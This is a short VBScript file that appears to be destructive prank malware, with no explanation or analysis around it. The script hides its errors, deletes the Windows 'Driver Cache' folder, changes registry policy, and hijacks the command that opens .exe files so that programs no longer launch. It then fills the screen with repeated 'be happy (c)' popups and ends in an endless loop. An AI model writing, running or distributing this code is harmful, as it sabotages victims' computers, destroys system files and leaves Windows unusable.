on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoSelectDownloadDir","1","REG_DWORD"
fso.deletefolder fso.getspecialfolder(0)+"\Driver Cache"
s.regwrite"HKCR\exefile\shell\open\command\","rundll32.exe"
i=999
while i>0 or i<0
S.popup "be happy (c)",999, "Заголовок сообщения",0+0
i=i-1
wend

do
fso.getfile("A:\")
loop

